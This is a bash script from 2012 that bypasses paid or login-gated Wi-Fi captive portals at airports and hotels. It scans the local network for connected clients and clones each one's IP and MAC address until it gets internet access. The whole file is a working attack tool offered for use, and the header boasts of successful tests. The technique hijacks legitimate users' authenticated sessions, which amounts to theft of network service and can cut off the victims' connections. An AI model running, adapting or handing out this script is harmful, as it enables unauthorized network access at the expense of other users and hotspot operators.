#!/bin/bash
#
# quickly bypass most public hotspots if there are any clients connected by clonning its ip + mac addresses
# version 0.2: successfully tested on 4 airports and 10 hotels using different captive portal solutions
#
# (c) 2012 Pau Oliva Fora - pof[at]eslack(.)org
# License: GPLv2+

IFACE=wlan0

brd=`ip addr show dev $IFACE |grep inet.*brd |awk '{print $4}'`
gw=`ip route |grep "^default via" |awk '{print $3}'`
mac=`ip addr show dev $IFACE |grep link/ether |awk '{print $2}'`
ipmask=`ip addr show dev $IFACE |grep "inet " |awk '{print $2}'`
mask=`echo $ipmask |cut -f 2 -d "/"`
network=`ipcalc -nb $ipmask |grep "^Network" |awk '{print $2}'`

# get gw mac
ping -n -c1 -w1 $gw >/dev/null
gwmac=`ip neighbour show dev $IFACE |grep lladdr |grep "^$gw " |awk '{print $3}' |tr [:upper:] [:lower:]`

echo "Discovering hosts on network $network, please wait"

# split large networks into /24 subnets and intercalate them
if [ $mask -lt 24 ]; then
	sipcalc -s 24 $network |grep "^Network" |awk '{print $3}' > /tmp/sipcalc.$$
	len=`cat /tmp/sipcalc.$$ |wc -l`
	half=$(( $len / 2 ))
	head -n $half /tmp/sipcalc.$$ > /tmp/subnet1.$$
	tail -n $half /tmp/sipcalc.$$ |tac > /tmp/subnet2.$$
	paste /tmp/subnet1.$$ /tmp/subnet2.$$ |tr "\t" "\n" > /tmp/sipcalc.$$
	rm /tmp/subnet1.$$ /tmp/subnet2.$$
else
	echo $network |cut -f 1 -d "/" > /tmp/sipcalc.$$
fi

for net in `cat /tmp/sipcalc.$$` ; do

	network="$net/$mask"
	nmap -n -PR -sP -oX /tmp/hotspot.$$.xml $network >/dev/null

	# process nmap results in reverse order
	for LINE in `tac /tmp/hotspot.$$.xml |grep "^<address addr=" |sed -e "s:addrtype=\"ipv4\":#:g" -e "s/vendor.*//g" |tr -d '\n' |sed -e "s:#:\n:g" -e "s: :#:g" |grep 'addrtype="mac"'`; do
		IP=`echo $LINE |sed -e "s:#: :g" |awk '{print $5}' |cut -f 2 -d '"'`
		MAC=`echo $LINE |sed -e "s:#: :g" |awk '{print $2}' |cut -f 2 -d '"' |tr [:upper:] [:lower:]`
		if [ "$IP" == "$brd" ]; then
			continue
		fi
		echo "Host $IP - $MAC"
		if [ "$MAC" == "$gwmac" ]; then
			# try to avoid gateways answering all arp requests
			MAC=`arping -I $IFACE -c 1 -w 1 -b $IP |grep reply |awk '{print $5}' |sed -e "s:\[::" -e "s:\]::" |sort -u |tr [:upper:] [:lower:] |grep -v "$gwmac"`
			if [ -z "$MAC" ]; then
				continue
			fi
			echo "Found $MAC for host $IP"
		fi
		if [ "$MAC" != "$gwmac" ]; then
			echo "Testing $IP - $MAC"

			ip link set $IFACE down
			ip link set dev $IFACE address $MAC
			ip link set $IFACE up
			ip addr flush dev $IFACE
			ip addr add $IP/$mask broadcast $brd dev $IFACE
			ip route add default via $gw

			# allow iface to settle
			sleep 1s
			# wait at least 3 sec for an icmp response
			ping -c1 -w3 8.8.8.8 >/dev/null
			if [ $? -eq 0 ]; then
				rm /tmp/hotspot.$$.xml
				echo "CONNECTED! :)"
				exit 0
			fi
			# test a second host, just in case
			ping -c1 -w3 192.0.43.10 >/dev/null
			if [ $? -eq 0 ]; then
				rm /tmp/hotspot.$$.xml
				echo "CONNECTED! :)"
				exit 0
			fi
		fi
		echo
	done
	rm /tmp/hotspot.$$.xml

done
rm /tmp/sipcalc.$$

echo "No luck! :("

# restore original mac and ip
ip link set $IFACE down
ip link set dev $IFACE address $mac
ip link set $IFACE up
ip addr flush dev $IFACE
ip addr add $ipmask broadcast $brd dev $IFACE
ip route add default via $gw
